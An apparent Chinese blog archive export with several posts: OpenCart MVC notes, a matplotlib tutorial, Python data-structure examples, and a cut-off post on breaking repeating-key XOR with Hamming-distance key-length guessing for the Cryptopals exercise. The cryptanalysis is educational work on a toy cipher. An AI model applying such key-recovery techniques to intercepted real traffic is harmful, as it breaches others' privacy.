&#123; $data['addresses'] = array(); &#125; if (isset($this-&gt;request-&gt;post['default'])) &#123; $data['default'] = $this-&gt;request-&gt;post['default']; &#125; elseif (!empty($customer_info)) &#123; $data['default'] = array_search($customer_info['address_id'], array_column($data['addresses'], 'address_id')); &#125; else &#123; $data['default'] = ''; &#125; $data['header'] = $this-&gt;load-&gt;controller('common/header'); $data['column_left'] = $this-&gt;load-&gt;controller('common/column_left'); $data['footer'] = $this-&gt;load-&gt;controller('common/footer'); $this-&gt;response-&gt;setOutput($this-&gt;load-&gt;view('customer/customer_form', $data)); &#125; 其实这个部分就是把前台View需要用到的事先约定的一些变量名，通过$data字典的形式传递，所有的这些$data字典的key值要么直接来自于post，get请求或者请求头，要么来自于数据库查询，要么来自业务自定义。最后通过$this-&gt;load-&gt;view(‘customer/customer_form’, $data)传递给前台View,从而继续进行渲染。紧接着我们来一窥customer/customer_form: 12345678910111213141516171819202122&#123;&#123; header &#125;&#125;&#123;&#123; column_left &#125;&#125;&lt;div id="content"&gt; &lt;div class="page-header"&gt; &lt;div class="container-fluid"&gt; &lt;div class="float-right"&gt; &lt;button type="submit" form="form-customer" data-toggle="tooltip" title="&#123;&#123; button_save &#125;&#125;" class="btn btn-primary"&gt;&lt;i class="fas fa-save"&gt;&lt;/i&gt;&lt;/button&gt; &lt;a href="&#123;&#123; cancel &#125;&#125;" data-toggle="tooltip" title="&#123;&#123; button_cancel &#125;&#125;" class="btn btn-light"&gt;&lt;i class="fas fa-reply"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt; &lt;h1&gt;&#123;&#123; heading_title &#125;&#125;&lt;/h1&gt; &lt;ol class="breadcrumb"&gt; &#123;% for breadcrumb in breadcrumbs %&#125; &lt;li class="breadcrumb-item"&gt;&lt;a href="&#123;&#123; breadcrumb.href &#125;&#125;"&gt;&#123;&#123; breadcrumb.text &#125;&#125;&lt;/a&gt;&lt;/li&gt; &#123;% endfor %&#125; &lt;/ol&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="container-fluid"&gt; &#123;% if error_warning %&#125; &lt;div class="alert alert-danger alert-dismissible"&gt;&lt;i class="fas fa-exclamation-circle"&gt;&lt;/i&gt; &#123;&#123; error_warning &#125;&#125; &lt;button type="button" class="close" data-dismiss="alert"&gt;&amp;times;&lt;/button&gt; &lt;/div&gt; &#123;% endif %&#125;......(此处省略N多行) 可以看到上面的twig前端语言基本双大括号里面的变量就是我们$data变量的key值，同样twig模板一些命令控制语句，可以用来减少html代码的编写量和处理简单的output逻辑，剩下的基本就是html的标签，就是普通的html文本。最后通过渲染引擎呈现给客户端。我们按下保存可以看到返回的界面如下； 红圈是我们这次的处理逻辑按钮，蓝色圈的按钮是和本次处理逻辑类似的连个业务，而黑色圈的语句就是调用了language模块返回的语句，可以参考上面的admin/language/customer/customer/customer.php language文件。 小结这是一篇总结自己学习MVC的不成熟笔记，主要以opencart为例，很多细节仍旧没有涉及，相关的理解或许仍旧有不到位的地方。今后会专门学习几个MVC的web框架来增强自己的理解和提升自己的架构能力。在这个分析的过程中逐渐有点理解到框架的力量和架构好的代码大致是个什么样子，ok,路还很长，且行且珍惜！]]></content>
      <tags>
        <tag>php</tag>
        <tag>MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python matplotlib 画图]]></title>
    <url>%2F2018%2F12%2F05%2Fpython-matplotlib-%E7%94%BB%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[常规操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import matplotlib.pyplot as pltimport numpy as npplt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号#绘图数据生成x = np.linspace(-10,10,1000)# 设置整体画布样式,可使用print(plt.style.available)#plt.style.use('ggplot')#定制化线条样式和颜色,参数名可以全程也可以缩写，如linestyle==ls;lineweight==lw......plt.plot(x,np.cos(x),ls='-',color="#000000",label="cos(x)")plt.plot(x,np.sin(x),ls=':',color="r",label="sin(x)")#设置显示标注的位置plt.legend(loc='best',title='图例') #设置x,y轴的标注范围plt.xlim([0,10]) plt.ylim(-1,1)#设置x,y轴的label以及边框美化,注意到字符串支持letax语法box=dict(facecolor='#6959CD',pad=2,alpha=.4)plt.xlabel("$x$",fontsize=20,bbox=box) plt.ylabel("$y=sin(x) or cos(x)$",fontsize=20,bbox=box) #设置网格线plt.grid(c="gray",ls=':')#绘制参考基准线，垂直于x轴或者垂直于y轴plt.axhline(0.25,ls='-',lw=2,c='y')plt.axvline(4,ls='-',lw=2,c='y')#绘制参考区域plt.axvspan(xmin=6,xmax=8,facecolor='gray',alpha=.6)plt.axhspan(ymin=-0.5,ymax=0,facecolor='gray',alpha=.6)#添加无指向性文本plt.text(2.8,0.25,"无指向",color='r',bbox=box)#添加指向性文本,注意到arrowprops指示被注释内容的箭头的属性字典plt.annotate("max--有指向",xy=(np.pi/2,1),xytext=(3,0.75),color='b',bbox=box,arrowprops=dict(arrowstyle='-&gt;',connectionstyle='arc3',color='b'))#添加文章标题plt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号plt.title("plot类常规作图")plt.show() 常用的绘图类型柱状图1234567891011121314151617181920# 柱状图x=[1,2,3,4,5,6]y=[3,1,2,6,7,9]plt.style.use('ggplot')plt.bar(x,y,align='center',color='red',tick_label=["类1",'类2','类3','类4','类5','类6'])plt.xlabel("类别")plt.ylabel("质量/kg")plt.show()#堆叠柱状图name_list = ['Monday','Tuesday','Friday','Sunday']num_list = [1.5,0.6,7.8,6]num_list1 = [1,2,3,1]plt.bar(range(len(num_list)), num_list, label='boy',fc = 'y')plt.bar(range(len(num_list)), num_list1, bottom=num_list, label='girl',tick_label = name_list,fc = 'r')plt.legend()plt.show() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051'''x包含所有柱子的下标的列表height包含所有柱子的高度值的列表width每个柱子的宽度。可以指定一个固定值，那么所有的柱子都是一样的宽。或者设置一个列表，这样可以分别对每个柱子设定不同的宽度。align柱子对齐方式，有两个可选值：center和edge。center表示每根柱子是根据下标来对齐, edge则表示每根柱子全部以下标为起点，然后显示到下标的右边。如果不指定该参数，默认值是center。其他可选参数有：color每根柱子呈现的颜色。同样可指定一个颜色值，让所有柱子呈现同样颜色；或者指定带有不同颜色的列表，让不同柱子显示不同颜色。edgecolor每根柱子边框的颜色。同样可指定一个颜色值，让所有柱子边框呈现同样颜色；或者指定带有不同颜色的列表，让不同柱子的边框显示不同颜色。linewidth每根柱子的边框宽度。如果没有设置该参数，将使用默认宽度，默认是没有边框。tick_label每根柱子上显示的标签，默认是没有内容。xerr每根柱子顶部在横轴方向的线段。如果指定一个固定值，所有柱子的线段将一直长；如果指定一个带有不同长度值的列表，那么柱子顶部的线段将呈现不同长度。yerr每根柱子顶端在纵轴方向的线段。如果指定一个固定值，所有柱子的线段将一直长；如果指定一个带有不同长度值的列表，那么柱子顶部的线段将呈现不同长度。ecolor设置 xerr 和 yerr 的线段的颜色。同样可以指定一个固定值或者一个列表。capsize这个参数很有趣, 对xerr或者yerr的补充说明。一般为其设置一个整数，例如 10。如果你已经设置了yerr 参数，那么设置 capsize 参数，会在每跟柱子顶部线段上面的首尾部分增加两条垂直原来线段的线段。对 xerr 参数也是同样道理。可能看说明会觉得绕，如果你看下图就一目了然了。error_kw设置 xerr 和 yerr 参数显示线段的参数，它是个字典类型。如果你在该参数中又重新定义了 ecolor 和 capsize，那么显示效果以这个为准。log这个参数，我暂时搞不懂有什么用。orientation设置柱子是显示方式。设置值为 vertical ，那么显示为柱形图。如果设置为 horizontal 条形图。不过 matplotlib 官网不建议直接使用这个来绘制条形图，使用barh来绘制条形图。''' 条形图1234567891011121314151617# 条形图x=[1,2,3,4,5,6]y=[3,1,2,6,7,9]plt.barh(x,y,align='center',color='red',tick_label=["类1",'类2','类3','类4','类5','类6'])plt.ylabel("类别")plt.xlabel("质量/kg")plt.show()#正负条形图a = np.array([5, 20, 15, 25, 10])b = np.array([10, 15, 20, 15, 5])plt.barh(range(len(a)), a)plt.barh(range(len(b)), -b)plt.show() 直方图12345678910111213141516171819# 常规直方图import numpy as npboxweight=np.random.randint(0,10,100)y=range(0,11,1)plt.hist(boxweight,y,histtype='bar',color='g',alpha=.7,label='例子')plt.legend()plt.show()#多类别直方图# 分别生成10000 ， 5000 ， 2000 个值x_multi = [np.random.randn(n) for n in [10000, 5000, 2000]]plt.hist(x_multi, 10, histtype='bar',label=list("ABC"))plt.title('多类型直方图')plt.legend()plt.show() 123456789101112131415161718192021222324252627282930313233'''x：指定要绘制直方图的数据；bins：指定直方图条形的个数；range：指定直方图数据的上下界，默认包含绘图数据的最大值和最小值；normed：是否将直方图的频数转换成频率；weights：该参数可为每一个数据点设置权重；cumulative：是否需要计算累计频数或频率；bottom：可以为直方图的每个条形添加基准线，默认为0；histtype：指定直方图的类型，默认为bar，除此还有’barstacked’, ‘step’, ‘stepfilled’；align：设置条形边界值的对其方式，默认为mid，除此还有’left’和’right’；orientation：设置直方图的摆放方向，默认为垂直方向；rwidth：设置直方图条形宽度的百分比；log：是否需要对绘图数据进行log变换；color：设置直方图的填充色；label：设置直方图的标签，可通过legend展示其图例；stacked：当有多个数据时，是否需要将直方图呈堆叠摆放，默认水平摆放；alpha：透明度，浮点数。''' 饼图12345678910111213141516171819202122232425262728293031323334353637labels = [u'大型',u'中型',u'小型',u'微型'] #定义标签sizes = [46,253,321,66] #每块值colors = ['red','yellowgreen','lightskyblue','yellow'] #每块颜色定义explode = (.05,.05,.05,.05) #将某一块分割出来，值越大分割出的间隙越大patches,text1,text2 = plt.pie(sizes, explode=explode, labels=labels, radius=1, #图例半径 colors=colors, labeldistance = 1.2, #图例距圆心半径倍距离 autopct = '%3.2f%%', #数值保留固定小数位 shadow = True, #阴影设置 startangle =90, #逆时针起始角度设置 wedgeprops=dict(width=0.7,edgecolor='w'),#设置图形厚度以及边缘颜色 pctdistance = .6) #数值距圆心半径倍数距离#patches饼图的返回值，texts1饼图外label的文本，texts2饼图内部文本plt.legend()plt.show()size = 0.3vals = np.array([[60., 32.], [37., 40.], [29., 10.]])cmap = plt.get_cmap("tab20c")outer_colors = cmap(np.arange(3)*4)inner_colors = cmap(np.array([1, 2, 5, 6, 9, 10]))plt.pie(vals.sum(axis=1), radius=1-size, colors=outer_colors,autopct = '%2.1f%%',pctdistance = .7, wedgeprops=dict(width=size, edgecolor='w'))plt.pie(vals.flatten(), colors=inner_colors,autopct = '%2.1f%%',pctdistance = .85, wedgeprops=dict(width=size, edgecolor='w'))plt.show() 图形分布1234567891011121314#方法一t=np.arange(0.0,2.0,0.1)s=np.sin(t*np.pi)plt.subplot(2,2,1) #要生成两行两列，这是第一个图plt.subplot('行','列','编号')plt.plot(t,s,'b--')plt.ylabel('y1')plt.subplot(2,2,2) #两行两列,这是第二个图plt.plot(2*t,s,'r--')plt.ylabel('y2')plt.subplot(2,2,3)#两行两列,这是第三个图plt.plot(3*t,s,'m--')plt.subplot(2,2,4)#两行两列,这是第四个图plt.plot(4*t,s,'k--')plt.show() 1234567#方法二t=np.arange(0.0,2.0,0.1)s=np.sin(t*np.pi)figure,ax=plt.subplots(2,2)ax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b--')plt.show() 123456789101112131415161718192021222324252627282930313233343536373839404142434445# 坐标轴共享t=np.arange(0.0,2.0,0.1)s=np.sin(t*np.pi)figure,ax=plt.subplots(2,2)ax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax[1][1].plot(t,s*2,'b-')plt.show()figure,ax=plt.subplots(2,2,sharex="all",sharey="all")ax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax[1][1].plot(t,s*2,'b-')plt.show()figure,ax=plt.subplots(2,2,sharex="row")#cloax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax[1][1].plot(t,s*2,'b-')plt.show()#共享个别图例坐标，如ax1和ax4figure,ax=plt.subplots(2,2)ax1=plt.subplot(221)ax1.plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax4=plt.subplot(224,sharex=ax1)ax4.plot(t,s*2,'b-')plt.show()#将共享坐标抽子区间空隙去掉figure,ax=plt.subplots(2,2,sharex="all",sharey="all")figure.subplots_adjust(hspace=0,wspace=0)ax[0][0].plot(t,s,'r*')ax[0][1].plot(t*2,s,'b-')ax[1][0].plot(t,s,'r*')ax[1][1].plot(t,s*2,'b-')plt.show() 参考文献[1] https://matplotlib.org/api/_as_gen/matplotlib.pyplot.html#module-matplotlib.pyplot]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让数据结构pythonic]]></title>
    <url>%2F2018%2F11%2F29%2F%E8%AE%A9%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84pythonic%2F</url>
    <content type="text"><![CDATA[琢磨着也到了不大不小的年纪，恰逢今年寒假打算打一波数模美赛，负责编程，所以平时抽点时间，用这一个半月重新把数据结构的相关内容捡起来，同时把之前看得不系统的python数据处理相关的知识系统化。最后决定以一门新的语言——python,来学习或者说是温习一下数据结构（之前学的是c），以及python进行数据处理的相关内容。 线性表看到一些文章和书籍上在线性表这块是自己定义类来实现的，甚至有些教材上直接在类中使用的是python自带的数据类型——列表。但是仔细思考一番线性表应该提供的一些操作，python内置的列表基本完全胜任，所以笔者认为，出于学习目的无可厚非，但要是真的在实践中这样做，不得不说有点画蛇添足。如果真的只是抱着学习线性表的构建的初衷也无可厚非，但感觉要学习还是直蹦底层的使用c或c++基于指针或者类的方式构建，收益更大。笔者使用python只是本着实用的目的，所以就不会依葫芦画瓢，我认为用python内置的列表对象及其方法，外加个迭代，就已经很好了。 堆栈和队列在python中没有与这两个数据结构类型直接关联的数据对象，但是有一些库可以提供队列的操作，如Queue库，里面集成了FIFO，LIFO的两种队列，其实也就是队列和堆栈没错了。所以本着pythonic的思想，完全可以不必要自己去实现堆栈，不过硬要实现起来，使用list对象，将其一些拓展操作封装成Stack，Queue，实现起来也比较方便。 12345678910111213141516171819202122import queueFIFO=queue.Queue(10) #创建一个最大长度为10的FIFO队列,数据结构中的队列if not FIFO.full(): FIFO.put("hello")FIFO.qsize()if not FIFO.empty(): item=FIFO.get()FIFO.qsize()LIFO=queue.LifoQueue(10) #创建一个最大长度为10的LIFO队列，数据结构中的栈if not LIFO.full(): LIFO.put("hello")if not LIFO.full(): LIFO.put(3) FIFO.qsize()if not LIFO.empty(): item1=LIFO.get()item2=LIFO.get()item2 &#39;hello&#39; 图图这一块是比较的复杂，但是python的networkx库可以给我们构建图或者是基于图这个数据结构来进行分析带来了很大的便利。 邻接列表表示法1234567891011a,b,c,d,e,f,g=range(7)N=[ &#123;b:2,c:1,d:2&#125;, #a &#123;c:4,e:3&#125;, #b &#123;d:8&#125;, #c &#123;e,7&#125;, #d &#123;f:5&#125;, #e &#123;f:1,c:6&#125;, #f &#123;f:9,c:7&#125; #g]N [{1: 2, 2: 1, 3: 2}, {2: 4, 4: 3}, {3: 8}, {4, 7}, {5: 5}, {5: 1, 2: 6}, {5: 9, 2: 7}] 邻接矩阵表示法123456789a,b,c,d,e,f,g=range(7)N=[[0,1,0,1,0,1,1], [1,0,0,0,0,0,1], [0,1,0,1,0,0,1], [1,0,0,0,0,0,0], [0,0,1,1,0,0,1], [1,0,0,0,1,1,1], [1,0,1,0,0,0,1]]N [[0, 1, 0, 1, 0, 1, 1], [1, 0, 0, 0, 0, 0, 1], [0, 1, 0, 1, 0, 0, 1], [1, 0, 0, 0, 0, 0, 0], [0, 0, 1, 1, 0, 0, 1], [1, 0, 0, 0, 1, 1, 1], [1, 0, 1, 0, 0, 0, 1]] 123#当然为了方便，我们也可以直接调用numpy库直接初始化一个邻接矩阵import numpy as npN=np.zeros([7,7])#初始化一个7节点的图，邻接举证的方式 可以看到因为在python内置了列表和字典这两种数据结构，这就使得我们构建图的过程更加直观和简单。当然构建图的方式不局限于上述的实现方式，其实我们可以参考以上的思路，利用python的特性，如字典，列表和集合对象，十分自由方便的创建我们自己数据结构。 NetworkX第三方库这个库可以说是相当的强大了，内置了很多图的分析算法，Prim，Dijkstra等等……,具体的可以参考（https://networkx.github.io/documentation/networkx-1.10/reference/algorithms.html） 无向图123456789101112131415161718192021222324import networkx as nximport matplotlib.pyplot as plt#建立一个空的无向图GG=nx.Graph()#添加一个节点1G.add_node(1)#添加一条边2-3（隐含着添加了两个节点2、3）G.add_edge(2,3)#对于无向图，边3-2与边2-3被认为是一条边G.add_edge(3,1)#输出全部的节点print(G.nodes())# 添加0-1、1-2和2-3三条边，权重分别是3.0和7.5G.add_weighted_edges_from([(0,1,3.0),(1,2,7.5),(2,3,1.0)])# 如果想读取权重，可以使用get_edge_data方法，它接受两个参数u和v，即边的起始点。print (G.get_edge_data(1,2))#输出全部的边print (G.edges())#输出边的数量print (G.number_of_edges())#输出点数print (G.number_of_nodes())nx.draw(G, with_labels=True)plt.show() [1, 2, 3] {&#39;weight&#39;: 7.5} [(1, 3), (1, 0), (1, 2), (2, 3)] 4 4 有向图123456789101112131415161718import networkx as nxD=nx.DiGraph()#添加一个节点1D.add_node(1)#添加一条边2-3（隐含着添加了两个节点2、3）D.add_edge(2,3)#对于无向图，边3-2与边2-3被认为是一条边D.add_edge(1,2)#输出全部的节点print(D.nodes())#输出全部的边print (D.edges())#输出边的数量print (D.number_of_edges())#输出点数print (D.number_of_nodes())nx.draw(D, with_labels=True)plt.show() [1, 2, 3] [(1, 2), (2, 3)] 2 3 最小生成树1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#生成graph G.clear() G = nx.Graph() G.add_weighted_edges_from([('0','1',2),('0','2',7),('1','2',3),('1','3',8),('1','4',5),('2','3',1),('3','4',4)]) #边和节点信息 edge_labels = nx.get_edge_attributes(G,'weight') labels=&#123;'0':'0','1':'1','2':'2','3':'3','4':'4'&#125; #生成节点位置 pos=nx.spring_layout(G) #把节点画出来 nx.draw_networkx_nodes(G,pos,node_color='g',node_size=500,alpha=0.8) #把边画出来 nx.draw_networkx_edges(G,pos,width=1.0,alpha=0.5,edge_color=['b','r','b','r','r','b','r']) #把节点的标签画出来 nx.draw_networkx_labels(G,pos,labels,font_size=16) #把边权重画出来 nx.draw_networkx_edge_labels(G, pos, edge_labels) #显示graph plt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号plt.title('有权图') plt.axis('on') plt.xticks([]) plt.yticks([]) plt.show() # 最小生成树#求得最小生成树,algorithm可以是kruskal,prim,boruvka一种,默认是kruskal KA = nx.minimum_spanning_tree(G,algorithm='kruskal') print(KA.edges(data=True)) #画出最小生成树edge_labels = nx.get_edge_attributes(G,'weight') nx.draw_networkx_nodes(KA,pos,node_color='g',node_size=500,alpha=0.8) nx.draw_networkx_edges(KA,pos,width=1.0,alpha=0.5) nx.draw_networkx_labels(KA,pos,font_size=16) nx.draw_networkx_edge_labels(G, pos, edge_labels) plt.rcParams['font.sans-serif']=['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus']=False #用来正常显示负号plt.title('最小生成树') plt.axis('on') plt.xticks([]) plt.yticks([]) plt.show()#直接拿到构成最小生成树的边,algorithm可以是kruskal,prim,boruvka一种,默认是kruskal mst = nx.minimum_spanning_edges(G, algorithm='kruskal', data=False) edgelist = list(mst) print(edgelist) [(&#39;0&#39;, &#39;1&#39;, {&#39;weight&#39;: 2}), (&#39;1&#39;, &#39;2&#39;, {&#39;weight&#39;: 3}), (&#39;2&#39;, &#39;3&#39;, {&#39;weight&#39;: 1}), (&#39;3&#39;, &#39;4&#39;, {&#39;weight&#39;: 4})] [(&#39;2&#39;, &#39;3&#39;), (&#39;0&#39;, &#39;1&#39;), (&#39;1&#39;, &#39;2&#39;), (&#39;3&#39;, &#39;4&#39;)] 最短路径1234567891011121314151617#生成graph G.clear() G = nx.Graph() G.add_weighted_edges_from([('0','1',2),('0','2',7),('1','2',3),('1','3',8),('1','4',5),('2','3',1),('3','4',4)]) #边和节点信息 edge_labels = nx.get_edge_attributes(G,'weight') labels=&#123;'0':'0','1':'1','2':'2','3':'3','4':'4'&#125; #dijkstra算法dpath=nx.dijkstra_path(G, source="1", target="3")#求最短路径dlen=nx.dijkstra_path_length(G,source="1", target="3")#求最短距离lis=list(path)for pt in lis: print(pt)print(dlen)print(dpath) 4 [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;] 树 在树这一块又比较多的概念，包括叶子结点，分支节点，节点的度，树的度，孩子节点，双亲节点，祖先节点，子孙节点，节点的层，树的深度，有序树，无序树…… 树的分类有：树，二叉树（完全二叉树（都有左右节点），满二叉树（所有节点除了最后一层都满了），线索二叉树（存储结构中包括先驱和后继），哈夫曼树（带权的最优二叉树）），森林（只是树的一种组合形式，其实也是树） 树的遍历：先序遍历，中序遍历，后序遍历，层次遍历 二叉树类123456789class TreeNode: def __init__(self,left,right): self.left=left self.right=right#调用方式如下：t=Tree(Tree("a","b"),Tree("c","d"))t.right.left &#39;c&#39; 多路搜索树123456class TreeNode: def __init__(self,kids,next=None): self.kids=self.val=kids self.next=nextt=Tree(Tree("a",Tree("b",Tree("c",Tree("d")))))t.kids.next.next.next.val &#39;d&#39; 孩子双亲表示法1234567891011class TreeNode: def __init__(self): self.data='#' self.parent='-1'troot=TreeNode()troot.data='root't=TreeNode()t.data="kid1"t.parent=troott.parent.datat.parent.data &#39;root&#39; 树的孩子表示法（拉链法）12345678910# 这种方法需要每个为每个节点建立一个孩子链class TreeNode(): def __init__(self): self.data='#' self.FirstChild=Noneclass ChildNode(): def __init__(self): self.index=-1#存储列表中的下标 self.NextSibling=None 树的孩子兄弟表示法12345class TreeNode(): def __init__(self): self.data='#' self.pFirstChild=None self.pNextSibling=None Huffman Encoding1234567import huffmanimport collections t1=huffman.codebook([('A', 2), ('B', 4), ('C', 1), ('D', 1)])print (t1)t2=huffman.codebook(collections.Counter('man the stand banana man').items())print (t2) {&#39;A&#39;: &#39;10&#39;, &#39;B&#39;: &#39;0&#39;, &#39;C&#39;: &#39;110&#39;, &#39;D&#39;: &#39;111&#39;} {&#39;m&#39;: &#39;0111&#39;, &#39;a&#39;: &#39;10&#39;, &#39;n&#39;: &#39;00&#39;, &#39; &#39;: &#39;111&#39;, &#39;t&#39;: &#39;1101&#39;, &#39;h&#39;: &#39;0101&#39;, &#39;e&#39;: &#39;0100&#39;, &#39;s&#39;: &#39;0110&#39;, &#39;d&#39;: &#39;11001&#39;, &#39;b&#39;: &#39;11000&#39;} 第三方库实现class tree其实只要到github 上搜索python tree 关键字就可以找到很多前人实现好的树类，所以本着拿来主义，我们可以在需要的时候直接进行import。这里推荐一种二叉树的实现类——binarytree(https://github.com/joowani/binarytree)。里面实现了二叉树的创建，反回树的属性和四种不同的遍历算法等。下面主要对这个库进行一些简单的使用介绍。 123456789from binarytree import Noderoot=Node(1)root.left = Node(2)root.right = Node(3)root.left.right = Node(4)root.left.right.left=Node(5)root.left.right.right=Node(6)print(root) ______1 / \ 2__ 3 \ 4 / \ 5 6 1print(root.values) [1, 2, 3, None, 4, None, None, None, None, 5, 6] 1print(root.max_leaf_depth,root.height,root.max_node_value,root.size) 3 3 6 6 1print(root.inorder)#中序遍历 [Node(2), Node(5), Node(4), Node(6), Node(1), Node(3)] 1print(root.preorder)#先序遍历 [Node(1), Node(2), Node(4), Node(5), Node(6), Node(3)] 1print(root.postorder)#后序遍历 [Node(5), Node(6), Node(4), Node(2), Node(3), Node(1)] 1print(root.levelorder)#层级遍历 [Node(1), Node(2), Node(3), Node(4), Node(5), Node(6)] 1print(list(root))#对binarytree对象使用list方法默认采用层级遍历 [Node(1), Node(2), Node(3), Node(4), Node(5), Node(6)] 当然了，还有一些其他的库，如treelib（https://treelib.readthedocs.io/en/latest/pyapi.html） 参考文献[1]https://github.com/prakhar1989/Algorithms[2]https://github.com/qiwsir/algorithm/blob/master/binary_tree_python.md[3]https://github.com/OmkarPathak/pygorithm[4]https://www.cnblogs.com/wushaogui/p/9239735.html[5]https://github.com/keon/algorithms]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[流密码攻击理论实践]]></title>
    <url>%2F2018%2F10%2F08%2F%E6%B5%81%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB%E7%90%86%E8%AE%BA%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[最近的密码学作业中涉及了一些关于重用密码本的密文破解的问题，感觉还是比较有价值的，所以在国庆期间打算借旅游之余把这篇文章落成。 背景一次一密的流密码被理论证明是完全理想化的不可破解的完美安全的加密方式。但是在现实生活中我们没法做到真正的伪随机的密密钥流。对于这种情况，想到的措施就是设计出攻击者优势可忽略的伪随机生成器，然后利用极短的密钥来近似的生成一次一密的密钥流。当然这篇文章不是讨论这些理论的证明和伪随机数生成器如何应用到安全的流密码，而是想介绍一些比较古老流密码的攻击思路，虽说比较古老，但是其指导意义和思维的锻炼是一点不含糊。 不安全的流密码使用举例 其中的一道题是coursa 密码学课程上的课后编程题，另一道题目是crypto chanllege set1 的一道流密码密钥重用的题。 在之后我们将尝试用两种方法来对其进行统计学以及英语特性上的攻击。这些攻击相当的犀利，准确率极高，只要捕获的密文足够多就能够实现对密钥的无差别猜解。以下是题目： coursa这道题目的大概意思说，我们捕获了一连串的密文，已知这些密文的加密方式为i抑或，并且抑或的密码本被多次使用了，我们能否通过这些捕获的存在不合理抑或利用方式的加密密文来还原出明文。读者可以点进连接去自己看看原题。不过这篇文章打算以下一个题目作为例子进行讲解，二者的解体思路和方法大同小异，核心思路一致。 crypto chanllege set1 question6这道题目很上一道题目其实十分的相似，都是流密码重用的类型，但是根据题目的提示，我们可以了解到一种利用汉明距离来进行密钥长度的猜接手段——汉名距离，在解除密钥长度后，我们可以采取两个方法来获取明文信息，具体细节稍后进行阐述。读者可以先进入原题进行一些初步理解，这里就不对题目做过多的解释。 攻击细节整个的攻击流程其实可以分为两个步骤：密钥长度猜解，其次是解出明文。接下来就对这两个部分进行是的剖析。 首先猜测密钥长度密钥长度的猜解其实比较直观的是进行暴力破解，在密钥长度比较短的时候比较凑效，但是随着密钥长度的增加，我们会发现暴力的方式会让效率相当的低下。甚至是根本解不出。但是在这两周的编程作业中，涉及到的密钥长度还是比较短的，不超过40位。暴力猜解的方法在思维上并没有什么难度，然后根据一番搜索，得知有这么一种利用The Hamming distance（汉明距离）来猜解密钥长度的方法。以下将对其进行进一步的阐述： 首先解释一下什么是汉明距离？汉明距离其实是在二进制层面观测两个等长字符串的比特位差异。可以看以下几个例子：123hamming(&quot;1010&quot;, &quot;1111&quot;) == 2hamming(&quot;1111&quot;, &quot;0000&quot;) == 4hamming(&quot;1111&quot;, &quot;1111&quot;) == 0 可以看到，1010与1111有两个比特位存在差异，所以汉明距离为2。有一种快速的求解汉明距离的方法就是将等长字符串的方法，那就是异或。将两个二进制的字符异或后计算值为1的比特位个数，就是最后的汉明距离。具体的代码如下： 1234567891011def bxor(a, b): # xor two byte strings of different lengths if len(a) &gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bits 知道了汉明距离和汉明距离代码实现后，我们应该思考，汉明距离和密钥长度的猜解有什么联系？通过阅读题干和相关拓展资料，我们知道，两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。另外我们也容易知道，正确分组的密文与密文的汉明距离等于明文与明文的汉明距离（可以通过按正确密钥长度分组的密文与密文异或等于明文与明文异或证明）。这样，我们可以知道，当我们使用了正确的密钥长度后，两两字母进行计算汉明距离，那么这个值应该是趋于最小。为了增加效率，我们不需要对每一对分组都计算汉明距离，只需取出前几对就可说明问题。当然为了排除偶然误差，结果不应该只取最小的那一个密钥长度，而是酌情多取几组。以下是crypto chanllege set1 question6这道题的密钥长度猜解代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import base64def bxor(a, b): # xor two byte strings of different lengths if len(a) &gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bitstext = &apos;&apos;with open(&quot;6.txt&quot;,&quot;r&quot;) as f: for line in f: text += lineb = base64.b64decode(text)normalized_distances = []for KEYSIZE in range(2, 40): #我们取其中前6段计算平局汉明距离 b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) )normalized_distances = sorted(normalized_distances,key=lambda x:x[1])print(normalized_distances)#以下是运行结果：[(5, 2.96), (2, 3.0), (3, 3.3333333333333335), (29, 